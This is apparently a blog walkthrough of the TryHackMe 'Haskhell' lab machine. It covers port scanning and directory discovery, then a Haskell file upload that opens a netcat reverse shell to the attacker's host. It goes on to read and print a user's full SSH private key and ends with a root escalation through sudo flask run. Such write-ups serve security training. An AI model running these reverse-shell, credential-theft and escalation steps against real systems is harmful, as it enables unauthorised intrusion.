<a class="page-link" href="/About.html">ABOUT</a><a class="page-link" href="/VulnMachines.html">VULNERABLE MACHINES</a><a class="page-link" href="/archives.html">ARCHIVES</a><a class="page-link" href="/categories.html">CATEGORIES</a><a class="page-link" href="/">HOME</a><a class="page-link" href="/tags.html">TAGS</a>




<span class="page-link">

<div id="google_translate_element" style="display: none;">
</div>

<span class="ct-language">
  <ul class="list-unstyled ct-language-dropdown">
    
      <li>
        <a href="#" class="lang-select" data-lang="en">
          
          <img src="https://www.countryflags.io/us/flat/64.png" title="English">
          
        </a>
      </li>
    
      <li>
        <a href="#" class="lang-select" data-lang="fr">
          
          <img src="https://www.countryflags.io/fr/flat/64.png" title="Franch">
          
        </a>
      </li>
    
      <li>
        <a href="#" class="lang-select" data-lang="zh-CN">
          
          <img src="https://www.countryflags.io/cn/flat/64.png" title="Chinese(Simple)">
          
        </a>
      </li>
    
      <li>
        <a href="#" class="lang-select" data-lang="ja">
          
          <img src="https://www.countryflags.io/jp/flat/64.png" title="Japan">
          
        </a>
      </li>
    
      <li>
        <a href="#" class="lang-select" data-lang="ko">
          
          <img src="https://www.countryflags.io/kr/flat/64.png" title="Korean">
          
        </a>
      </li>
    
      <li>
        <a href="#" class="lang-select" data-lang="ru">
          
          <img src="https://www.countryflags.io/ru/flat/64.png" title="Russia">
          
        </a>
      </li>
    
  </ul>
</span>

<script type="text/javascript">
function googleTranslateElementInit() {
  new google.translate.TranslateElement({
    pageLanguage: '',
    autoDisplay: false,
    layout: google.translate.TranslateElement.InlineLayout.VERTICAL
  }, 'google_translate_element');

  function restoreLang() {
    var iframe = document.getElementsByClassName('goog-te-banner-frame')[0];
    if (!iframe) return;

    var innerDoc = iframe.contentDocument || iframe.contentWindow.document;
    var restore_el = innerDoc.getElementsByTagName("button");

    for (var i = 0; i < restore_el.length; i++) {
      if (restore_el[i].id.indexOf("restore") >= 0) {
        restore_el[i].click();
        var close_el = innerDoc.getElementsByClassName("goog-close-link");
        close_el[0].click();
        return;
      }
    }
  }

  function triggerHtmlEvent(element, eventName) {
    var event;
    if (document.createEvent) {
      event = document.createEvent('HTMLEvents');
      event.initEvent(eventName, true, true);
      element.dispatchEvent(event);
    } else {
      event = document.createEventObject();
      event.eventType = eventName;
      element.fireEvent('on' + event.eventType, event);
    }
  }

  var googleCombo = document.querySelector("select.goog-te-combo");
  var langSelect = document.querySelector('.ct-language');
  langSelect.addEventListener('click', function(event) {
    if (!event.target) {
      return;
    }

    var selected = document.querySelector('.ct-language .ct-language-selected');
    if (selected) {
      selected.classList.remove('ct-language-selected');
    }

    var target = event.target;
    while (target && target !== langSelect ) {
      if (target.matches('.lang-select')) {
        break;
      }
      target = target.parentElement;
    }

    if (target && target.matches('.lang-select')) {
      var lang = target.getAttribute('data-lang');
      if (googleCombo.value == lang) {
        restoreLang();
      } else {
        target.parentElement.classList.add('ct-language-selected');
        googleCombo.value = lang;
        triggerHtmlEvent(googleCombo, 'change');
      }
    }

    event.preventDefault();
  });
}
</script>

<script type="text/javascript" src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
</span>
</div>
        </nav>
</div>
  </div>
</header>

<script>
  (function() {
    var lastScrollY = getScrollPos().y;
    var documentElement = document.documentElement;

    function storeScrollData() {
      var y = getScrollPos().y;var scrollStatus = "";

      if (y <= 0) {
        scrollStatus = "top";
      } else if ((window.innerHeight + y) >= document.body.offsetHeight) {
        scrollStatus = "bottom";
      } else {
        var isScrollDown = (y - lastScrollY > 0) ? true : false;
        scrollStatus = isScrollDown ? "down" : "up";
      }

      lastScrollY = y;
      documentElement.setAttribute("data-scroll-status", scrollStatus);
    }

    window.addEventListener('scroll', function(e) {
      storeScrollData();
    });

    storeScrollData();
  })();
</script>










































<script>
  function hashLocate(hashValue) {
    hashValue = hashValue.replace(/^.*#h-/, '');
    var element = document.getElementById(hashValue);

    if (!element) {
      return;
    }

    var header = document.querySelector('header.site-header');
    var headerRect = header.getBoundingClientRect();
    var headerTop = Math.floor(headerRect.top);
    var headerHeight = Math.floor(headerRect.height);
    var scrollPos = getScrollPos();
    var offsetY = element.offsetTop - (headerTop + headerHeight + 20);

    if (offsetY == scrollPos.y) {
      return;
    }

    if (headerTop == 0  && offsetY > scrollPos.y) {
      offsetY += headerHeight + 2;
    } else if (headerTop < 0  && offsetY < scrollPos.y) {
      offsetY -= headerHeight - 2;
    }

    smoothScrollTo(offsetY);
  }

  // The first event occurred
  window.addEventListener('load', function(event) {
    if (window.location.hash) {
      hashLocate(window.location.hash);
    }
  });

  // The first event occurred
  window.addEventListener('click', function(event) {
    if (event.target.tagName.toLowerCase() == 'a') {
      hashLocate(event.target.getAttribute('href'));
    }
  });
</script>
<div class="theme-toggle">
  <input type="checkbox" id="theme-switch">
  <label for="theme-switch">
    <div class="toggle"></div>
    <div class="names">
      <p class="light">Light</p>
      <p class="dark">Dark</p>
    </div>
  </label>
</div>




<script>
  (function() {
    var sw = document.getElementById('theme-switch');
    var html = document.getElementsByTagName('html')[0];
    var nightModeOption = ('auto' || 'auto').toLowerCase();
    var storage = nightModeOption === 'manual'
        ? localStorage
        : sessionStorage;
    var themeData = loadThemeData();

    function saveThemeData(data) {
      storage.setItem('theme', JSON.stringify(data));
    }

    function loadThemeData() {
      var data = storage.getItem('theme');
      try {
        data = JSON.parse(data ? data : '');
      } catch(e) {
        data = { nightShift: undefined, autoToggleAt: 0 };
        saveThemeData(data);
      }
      return data;
    }

    function handleThemeToggle(nightShift) {
      themeData.nightShift = nightShift;
      saveThemeData(themeData);
      html.dataset.theme = nightShift ? 'dark' : 'light';
      setTimeout(function() {
        sw.checked = nightShift ? true : false;
      }, 50);
    }

    function autoThemeToggle() {
      // Next time point of theme toggle
      var now = new Date();
      var toggleAt = new Date();
      var hours = now.getHours();
      var nightShift = hours >= 19 || hours <=7;

      if (nightShift) {
        if (hours > 7) {
          toggleAt.setDate(toggleAt.getDate() + 1);
        }
        toggleAt.setHours(7);
      } else {
        toggleAt.setHours(19);
      }

      toggleAt.setMinutes(0);
      toggleAt.setSeconds(0);
      toggleAt.setMilliseconds(0)

      var delay = toggleAt.getTime() - now.getTime();

      // auto toggle theme mode
      setTimeout(function() {
        handleThemeToggle(!nightShift);
      }, delay);

      return {
        nightShift: nightShift,
        toggleAt: toggleAt.getTime()
      };
    }

    // Listen the theme toggle event
    sw.addEventListener('change', function(event) {
      handleThemeToggle(event.target.checked);
    });

    if (nightModeOption == 'auto') {
      var data = autoThemeToggle();

      // Toggle theme by local setting
      if (data.toggleAt > themeData.autoToggleAt) {
        themeData.autoToggleAt = data.toggleAt;
        handleThemeToggle(data.nightShift);
      } else {
        handleThemeToggle(themeData.nightShift);
      }
    } else if (nightModeOption == 'manual') {
      handleThemeToggle(themeData.nightShift);
    } else {
      var nightShift = themeData.nightShift;
      if (nightShift === undefined) {
        nightShift = nightModeOption === 'on';
      }
      handleThemeToggle(nightShift);
    }
  })();
</script>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <div class="framework">
  <section class="main">

     <div class="post">
  <section>









<header class="post-header">
  <h1 class="post-title p-name" itemprop="name headline">Tryhackme Haskhell</h1>
  <h3 class="post-subtitle"></h3>

  <p class="post-meta">
    <time class="dt-published" datetime="2020-07-08T15:04:00+05:30" itemprop="datePublished"><i class="fa fa-calendar"></i> Jul 08, 2020
    </time>
    
    <img src="/assets/img/sample/hask/hask.png">
    
    
    
































    <span class="post-reading-time left-vsplit"><i class="fa fa-clock-o"></i> About 8 mins</span>
  </p>
<div class="post-tags">
<a class="post-tag" href="/tags.html#linux">#linux</a><a class="post-tag" href="/tags.html#gobuster">#gobuster</a><a class="post-tag" href="/tags.html#boot2root">#boot2root</a>
</div></header>
<article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

    <div class="post-content e-content" itemprop="articleBody">

      <h2 id="lets-get-started">Let’s get started</h2>

<h2 id="nmap-scan">Nmap Scan.</h2>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
<span class="n">nmap</span> <span class="o">-</span><span class="n">sV</span> <span class="o">-</span><span class="n">sC</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="o">-</span><span class="no">T4</span> <span class="n">hask</span><span class="p">.</span><span class="nf">thm</span> 
<span class="no">Starting</span> <span class="no">Nmap</span> <span class="mf">7.80</span> <span class="p">(</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span> <span class="p">)</span> <span class="n">at</span> <span class="mi">2020</span><span class="o">-</span><span class="mo">07</span><span class="o">-</span><span class="mi">08</span> <span class="mo">03</span><span class="p">:</span><span class="mi">30</span> <span class="no">EDT</span>
<span class="no">Nmap</span> <span class="nb">scan</span> <span class="n">report</span> <span class="k">for</span> <span class="n">hask</span><span class="p">.</span><span class="nf">thm</span> <span class="p">(</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">129.213</span><span class="p">)</span>
<span class="no">Host</span> <span class="n">is</span> <span class="n">up</span> <span class="p">(</span><span class="mf">0.16</span><span class="n">s</span> <span class="n">latency</span><span class="p">)</span><span class="o">.</span>
<span class="no">Not</span> <span class="ss">shown: </span><span class="mi">65533</span> <span class="n">closed</span> <span class="n">ports</span>
<span class="no">PORT</span>     <span class="no">STATE</span> <span class="no">SERVICE</span> <span class="no">VERSION</span>
<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>   <span class="nb">open</span>  <span class="n">ssh</span>     <span class="no">OpenSSH</span> <span class="mf">7.6</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">4</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">3</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey: 
</span><span class="o">|</span>   <span class="mi">2048</span> <span class="mi">1</span><span class="n">d</span><span class="ss">:f3</span><span class="p">:</span><span class="mi">53</span><span class="ss">:f7</span><span class="p">:</span><span class="mi">6</span><span class="n">d</span><span class="p">:</span><span class="mi">5</span><span class="n">b</span><span class="ss">\:a1\:d4</span><span class="p">:</span><span class="mi">84</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">0</span><span class="n">d</span><span class="ss">:dd</span><span class="p">:</span><span class="mi">66</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">4</span><span class="n">d</span><span class="p">:</span><span class="mi">90</span> <span class="p">(</span><span class="no">RSA</span><span class="p">)</span>
<span class="o">|</span>   <span class="mi">256</span> <span class="mi">26</span><span class="p">:</span><span class="mi">7</span><span class="n">c</span><span class="ss">:bd</span><span class="p">:</span><span class="mi">33</span><span class="p">:</span><span class="mi">8</span><span class="n">f</span><span class="ss">:bf</span><span class="p">:</span><span class="mi">09</span><span class="ss">:ac</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="ss">\:e3\:d3</span><span class="p">:</span><span class="mi">0</span><span class="n">a</span><span class="ss">:c3</span><span class="p">:</span><span class="mi">34</span><span class="ss">:bc</span><span class="p">:</span><span class="mi">14</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="n">d5</span><span class="ss">:fb</span><span class="p">:</span><span class="mi">55</span><span class="ss">\:a0\:fd\:e8\:e1:ab</span><span class="p">:</span><span class="mi">9</span><span class="n">e</span><span class="p">:</span><span class="mi">46</span><span class="ss">\:af\:b8</span><span class="p">:</span><span class="mi">71</span><span class="p">:</span><span class="mi">90</span><span class="p">:</span><span class="mo">00</span><span class="p">:</span><span class="mi">26</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
<span class="mi">5001</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">http</span>    <span class="no">Gunicorn</span> <span class="mf">19.7</span><span class="o">.</span><span class="mi">1</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="n">gunicorn</span><span class="o">/</span><span class="mf">19.7</span><span class="o">.</span><span class="mi">1</span>
<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="no">Homepage</span>
<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">\:linux\:linux_kernel</span>

<span class="no">Service</span> <span class="n">detection</span> <span class="n">performed</span><span class="o">.</span> <span class="no">Please</span> <span class="n">report</span> <span class="n">any</span> <span class="n">incorrect</span> <span class="n">results</span> <span class="n">at</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">nmap</span><span class="p">.</span><span class="nf">org</span><span class="o">/</span><span class="n">submit</span><span class="o">/</span> <span class="o">.</span>
<span class="no">Nmap</span> <span class="ss">done: </span><span class="mi">1</span> <span class="no">IP</span> <span class="n">address</span> <span class="p">(</span><span class="mi">1</span> <span class="n">host</span> <span class="n">up</span><span class="p">)</span> <span class="n">scanned</span> <span class="k">in</span> <span class="mf">657.29</span> <span class="n">seconds</span>
</code></pre></div></div>

<h3 id="from-the-nmap-scan-i-can-see-that-port-5001-is-the-only-useful-port-that-can-be-enumerated">From the <code class="language-plaintext highlighter-rouge">Nmap</code> scan I can see that port <code class="language-plaintext highlighter-rouge">5001</code> is the only useful port that can be enumerated.</h3>

<p>Having a look on the http site @ 5001 I come to see this page</p>

<p><img src="/assets/img/sample/hask/hask1.jpg" alt=""></p>

<p>Seeing the hyperlink <code class="language-plaintext highlighter-rouge">homework here</code> I clicked on it and it took me to the page where an assignment can be submitted.</p>

<p><img src="/assets/img/sample/hask/hask2.png" alt=""></p>

<h3 id="clicking-on-the-submit-button-it-says-that-page-not-found">Clicking on the submit button it says that <code class="language-plaintext highlighter-rouge">PAGE NOT FOUND</code>.</h3>

<p><img src="/assets/img/sample/hask/hask3.png" alt=""></p>

<p>Using <code class="language-plaintext highlighter-rouge">Gobuster</code> to find the directories of the machine.</p>

<h2 id="gobuster">Gobuster</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@Ac3:~# gobuster <span class="nb">dir</span> <span class="nt">-u</span> http://hask.thm:5001/ <span class="nt">-w</span> /usr/share/dirb/wordlists/common.txt 
<span class="o">===============================================================</span>
Gobuster v3.0.1
by OJ Reeves <span class="o">(</span>@TheColonial<span class="o">)</span> &amp; Christian Mehlmauer <span class="o">(</span>@_FireFart_<span class="o">)</span>
<span class="o">===============================================================</span>
<span class="o">[</span>+] Url:            http://hask.thm:5001/
<span class="o">[</span>+] Threads:        10
<span class="o">[</span>+] Wordlist:       /usr/share/dirb/wordlists/common.txt
<span class="o">[</span>+] Status codes:   200,204,301,302,307,401,403
<span class="o">[</span>+] User Agent:     gobuster/3.0.1
<span class="o">[</span>+] Timeout:        10s
<span class="o">===============================================================</span>
2020/07/08 03\:33\:08 Starting gobuster
<span class="o">===============================================================</span>
/submit <span class="o">(</span>Status: 200<span class="o">)</span>
<span class="o">===============================================================</span>
2020/07/08 03\:36\:03 Finished
<span class="o">===============================================================</span>
</code></pre></div></div>

<h3 id="so-its-not-uploads-but-its-submit">So it’s not <code class="language-plaintext highlighter-rouge">uploads</code> but it’s <code class="language-plaintext highlighter-rouge">Submit</code>.</h3>

<h3 id="tried-a-bunch-of-stuff-like-uploading-a-php-shell-and-stuff-like-that-but-nothing-seems-to-be-working">Tried a bunch of stuff like uploading a <code class="language-plaintext highlighter-rouge">PHP</code> shell and stuff like that, but nothing seems to be working.</h3>

<p><img src="/assets/img/sample/hask/hask4.png" alt=""></p>

<h3 id="remembering-from-previous-pages-this-site-probably-accepts-a-haskell-scripts">Remembering from previous pages this site probably accepts a haskell scripts.</h3>

<h2 id="reverse-shell">Reverse shell</h2>

<h3 id="a-little-bit-research-on-haskell-i-found-that-we-can-call-a-command-using-the-below-script">A little bit research on haskell I found that we can call a command using the below script.</h3>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">Ac3</span><span class="p">:</span><span class="o">~/</span><span class="n">Haskhell</span><span class="c1"># cat shell.hs 
</span><span class="n">module</span> <span class="n">Main</span> <span class="n">where</span>

<span class="kn">import</span> <span class="nn">System.Process</span>

<span class="n">main</span> <span class="o">=</span> <span class="n">callCommand</span> <span class="s">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.9.2.148 5566 &gt;/tmp/f"</span>
</code></pre></div></div>

<h3 id="uploading-the-file-and-starting-up-a-listner-nc--lnvp-5566-and-visiting-the-url-haskthmuploadsshellhs-gave-me-the-reverse-shell">Uploading the file and starting up a listner <code class="language-plaintext highlighter-rouge">nc -lnvp 5566</code> and visiting the url <code class="language-plaintext highlighter-rouge">hask.thm/uploads/shell.hs</code> gave me the reverse shell.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="vi">@Ac3</span><span class="ss">:~</span><span class="o">/</span><span class="no">Haskhell</span><span class="c1"># nc -lnvp 5566</span>
<span class="n">listening</span> <span class="n">on</span> <span class="p">[</span><span class="n">any</span><span class="p">]</span> <span class="mi">5566</span> <span class="o">...</span>
<span class="n">connect</span> <span class="n">to</span> <span class="p">[</span><span class="mf">10.9</span><span class="o">.</span><span class="mf">2.148</span><span class="p">]</span> <span class="n">from</span> <span class="p">(</span><span class="no">UNKNOWN</span><span class="p">)</span> <span class="p">[</span><span class="mf">10.10</span><span class="o">.</span><span class="mf">129.213</span><span class="p">]</span> <span class="mi">44224</span>
<span class="sr">/bin/s</span><span class="ss">h: </span><span class="mi">0</span><span class="p">:</span> <span class="n">can</span><span class="err">'</span><span class="n">t</span> <span class="n">access</span> <span class="n">tty</span><span class="p">;</span> <span class="n">job</span> <span class="n">control</span> <span class="n">turned</span> <span class="n">off</span>
<span class="err">$</span> <span class="nb">id</span>
<span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">flask</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">flask</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">flask</span><span class="p">)</span>
<span class="err">$</span> 
</code></pre></div></div>

<blockquote>
  <p>We can use <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash");'</code> for a shell upgrade.</p>
</blockquote>

<h2 id="getting-usertxt">Getting User.txt</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>flask@haskhell:/home<span class="nv">$ </span><span class="nb">ls
</span>flask  haskell  prof
flask@haskhell:/home<span class="nv">$ </span>
flask@haskhell:/home<span class="nv">$ </span><span class="nb">cd </span>prof
<span class="nb">cd </span>prof
flask@haskhell:/home/prof<span class="nv">$ </span><span class="nb">ls
ls
</span>__pycache__  user.txt
flask@haskhell:/home/prof<span class="nv">$ </span><span class="nb">cat </span>user.txt
<span class="nb">cat </span>user.txt
flag<span class="o">{</span><span class="nt">--------------</span><span class="o">}</span>

</code></pre></div></div>
<h3 id="from-here-i-see-a-ssh-folder-which-contains-the-id_rsa-of-professor-so-i-copied-that-to-my-kali-and-used-ssh-to-login-as-prof">From here I see a <code class="language-plaintext highlighter-rouge">.ssh</code> folder which contains the <code class="language-plaintext highlighter-rouge">id_rsa</code> of professor, So I copied that to my <code class="language-plaintext highlighter-rouge">kali</code> and used <code class="language-plaintext highlighter-rouge">ssh</code> to login as <code class="language-plaintext highlighter-rouge">prof</code>.</h3>

<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">flask</span><span class="vi">@haskhell</span><span class="ss">:/</span><span class="n">home</span><span class="o">/</span><span class="n">prof</span><span class="o">/</span><span class="p">.</span><span class="nf">ssh</span><span class="err">$</span> <span class="n">cat</span> <span class="n">id_rsa</span>
<span class="n">cat</span> <span class="n">id_rsa</span>
<span class="o">-----</span><span class="k">BEGIN</span> <span class="no">RSA</span> <span class="no">PRIVATE</span> <span class="no">KEY</span><span class="o">-----</span>
<span class="no">MIIEpAIBAAKCAQEA068E6x8</span><span class="o">/</span><span class="n">vMcUcitx9zXoWsF8WjmBB04VgGklNQCSEHtzA9cr</span>
<span class="mi">94</span><span class="n">rYpUPcxxxYyw</span><span class="o">/</span><span class="n">dAii0W6srQuRCAbQxO5Di</span><span class="o">+</span><span class="n">tv9aWXmBGMEt0</span><span class="o">/</span><span class="mi">3</span><span class="n">tOE7D09RhZGQ</span>
<span class="n">b68lAFDjSSJaVlVzPi</span><span class="o">+</span><span class="n">waotyP2ccVJDjXkwK0KIm6RsACIOhM9GtI2wyZ6vOg4ss</span>
<span class="no">Nb</span><span class="o">+</span><span class="mi">7</span><span class="no">UY60iOkcOAWP09Omzjc2q7hcE6CuV6f7</span><span class="o">+</span><span class="n">iObamfGlZ4QQ5IvUj0etStDD6iU</span>
<span class="no">WQX4vYewYqUz8bedccFvpC6uP2FGvDONYXrLWWua7wlwSgOqeXXxkG7fxVqYY2</span><span class="o">++</span>
<span class="mi">6</span><span class="no">ZVm8RE7TpPNxsQNDwpnxOiwTxGMgCrIMxgRVwIDAQABAoIBAQCTLXbf</span><span class="o">+</span><span class="n">wQXvtrq</span>
<span class="no">XmaImQSKRUiuepjJeXLdqz1hUpo7t3lKTEqXfAQRM9PG5GCgHtFs9NwheCtGAOob</span>
<span class="n">wSsR3TTTci0JIP4CQs4</span><span class="o">+</span><span class="n">nez96DNl</span><span class="o">+</span><span class="mi">6</span><span class="no">IUmhawcDfrtlGwwZ</span><span class="o">/</span><span class="no">JsvPDYujnyziN</span><span class="o">+</span><span class="no">KTr</span>
<span class="mi">7</span><span class="n">ykGoRxL3tHq9Qja4posKzaUEGAjTz8NwrhzB6xatsmcWBV0fFoWzpS</span><span class="o">/</span><span class="n">xWzW3i7F</span>
<span class="n">gAoYxc6</span><span class="o">+</span><span class="mi">4</span><span class="n">s5bKHsJima2Aj5F3XtHfipkMdBvbl</span><span class="o">+</span><span class="n">sjGllgiQn</span><span class="o">/</span><span class="n">oEjYMIX5wc7</span><span class="o">+</span><span class="n">se2</span>
<span class="n">o7FERO2oy3I5jUOlULsr9BwQpNFA2Qenc4Wc7ghb0LfCVaUs</span><span class="o">/</span><span class="no">RHQ7IQ4F3yp</span><span class="o">/</span><span class="no">G67</span>
<span class="mi">54</span><span class="n">oLue6hAoGBAPCe</span><span class="o">+</span><span class="no">WsnOXzhwQ9WXglhfztDR1lcwSFMeHZpcxYUVqmVEi2ZMLll</span>
<span class="no">B67SCri9lHHyvBtrH7YmZO5Q9UcGXdLCZGmbkJUdX2bjqV0zwwx1qOiVY8LPnZSJ</span>
<span class="no">LJN</span><span class="o">+</span><span class="mi">0</span><span class="n">p1dRHsO3n4vTHO8mVuiM5THi6pcgzSTggIhS</span><span class="o">+</span><span class="n">e1ks7nlQKiBuD</span><span class="o">/</span><span class="no">AoGBAOE2</span>
<span class="n">kwAMtvI03JlkjvOHsN5IhMbOXP0zaRSrKZArDCcqDojDL</span><span class="o">/</span><span class="no">AQltQkkLtQPdUPJgdY</span>
<span class="mi">3</span><span class="n">gOkUJ2BCHNlIsAtUjrTj</span><span class="o">+</span><span class="no">T76N512rO2sSidOEXRDCc</span><span class="o">+</span><span class="n">g</span><span class="o">/</span><span class="no">QwdgENiq</span><span class="o">/</span><span class="n">w9JroeWFc</span>
<span class="n">g9qM3f2cl</span><span class="o">/</span><span class="no">EkjxRgiyuTfK6mbzcuMSveX4LfCXepAoGAd2MZc</span><span class="o">+</span><span class="mi">4</span><span class="no">ZWvoUNUzwCY2D</span>
<span class="n">eF8QVqlr9d6gYng9rvXWbfvV8iPxBfu3zSjQQwtlTQhYBu6m5FS2fXxTxrLE</span><span class="o">+</span><span class="no">J6U</span>
<span class="sr">/cU+/o</span><span class="mi">19</span><span class="no">WWqaDPFy1IrIjOYagn1KvXk2UdR6IbQ2FyywfkFvmHk6Sjn3h9leVd</span><span class="o">/</span><span class="n">j</span>
<span class="no">BcIunmnw5H214s0KpSzJZvcCgYA5Ca9VNeMnmIe</span><span class="o">+</span><span class="no">OZ</span><span class="o">+</span><span class="no">Swezjfw5Ro3YdkmWsnGTc</span>
<span class="no">ZGqhiJ9Bt91uOWVZuSEGr53ZVgrVlYY0</span><span class="o">+</span><span class="n">eqI2WMghp60eUX4LBinb71cihCnrz9S</span>
<span class="sr">/+5+kCE51zVoJNXeEmXrhWUNzo7fP6UNNtwKHRzGL/</span><span class="no">IkwQa</span><span class="o">+</span><span class="no">NI5BVVmZahN9</span><span class="o">/</span><span class="n">sXF</span>
<span class="n">yWMGcQKBgQDheyI7eKTDMsrEXwMUpl5aiwWPKJ0gY</span><span class="o">/</span><span class="mi">2</span><span class="n">hS0WO3XGQtx6HBwg6jJKw</span>
<span class="no">MMn8PNqYKF3DWex59PYiy5ZL1pUG2Y</span><span class="o">+</span><span class="n">iadGfIbStSZzN4nItF5</span><span class="o">+</span><span class="n">yC42Q2wlhtwgt</span>
<span class="n">i4MU8bepL</span><span class="o">/</span><span class="no">GTMgaiR8RmU2qY7wRxfK2Yd</span><span class="o">+</span><span class="mi">8</span><span class="o">+</span><span class="no">GDuzLPEoS7ONNjLhNA</span><span class="o">==</span>
<span class="o">-----</span><span class="k">END</span> <span class="no">RSA</span> <span class="no">PRIVATE</span> <span class="no">KEY</span><span class="o">-----</span>
</code></pre></div></div>
<h2 id="ssh-to-prof">SSH to Prof</h2>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">Ac3</span><span class="p">:</span><span class="o">~/</span><span class="n">Haskhell</span><span class="c1"># ssh -i id_rsa prof@hask.thm
</span><span class="n">The</span> <span class="n">authenticity</span> <span class="n">of</span> <span class="n">host</span> <span class="s">'hask.thm (10.10.129.213)'</span> <span class="n">can</span><span class="s">'t be established.
ECDSA key fingerprint is SHA256:hx58wuaesK7WY+jWhWJdlCKNY2TR3P0MqLqqDTwVtZA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="n">hask</span><span class="p">.</span><span class="n">thm</span><span class="p">,</span><span class="mf">10.10</span><span class="p">.</span><span class="mf">129.213</span><span class="s">' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Jul  8 08\:06\:37 UTC 2020

  System load:  0.0                Processes:           108
  Usage of /:   26.3% of 19.56GB   Users logged in:     0
  Memory usage: 48%                IP address for eth0: 10.10.129.213
  Swap usage:   0%


39 packages can be updated.
0 updates are security updates.


Last login: Wed May 27 18\:45\:06 2020 from 192.168.126.128
$ id
uid=1002(prof) gid=1002(prof) groups=1002(prof)
</span></code></pre></div></div>

<blockquote>
  <p>We can use <code class="language-plaintext highlighter-rouge">python -c 'import pty;pty.spawn("/bin/bash");'</code> for a shell upgrade.</p>
</blockquote>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
$ python -c 'import pty;pty.spawn("/bin/bash");'
prof@haskhell:~$ 

</code></pre></div></div>

<h2 id="checking-the-priv-of-prof">Checking the priv of <code class="language-plaintext highlighter-rouge">prof</code>
</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prof@haskhell:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>prof on haskhell:
    env_reset, env_keep+<span class="o">=</span>FLASK_APP, mail_badpass,
    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User prof may run the following commands on haskhell:
    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/flask run
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>prof@haskhell:~<span class="nv">$ </span>nano root.py
import os
os.system<span class="o">(</span><span class="s2">"/bin/sh"</span><span class="o">)</span>
prof@haskhell:~<span class="nv">$ </span>nano root.py
prof@haskhell:~<span class="nv">$ </span><span class="nb">export </span><span class="nv">FLASK_APP</span><span class="o">=</span>root.py
prof@haskhell:~<span class="nv">$ </span><span class="nb">sudo </span>flask run
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
<span class="c"># cat /root/root.txt</span>
flag<span class="o">{</span><span class="k">*****************</span><span class="o">}</span>
</code></pre></div></div>

<p>If you like my work, please do consider giving me +rep on HACKTHEBOX.<br>
My HackTheBox profile: <a href="https://www.hackthebox.eu/home/users/profile/291968">https://www.hackthebox.eu/home/users/profile/291968</a></p>



    </div>

</article>
<div class="post-nav">
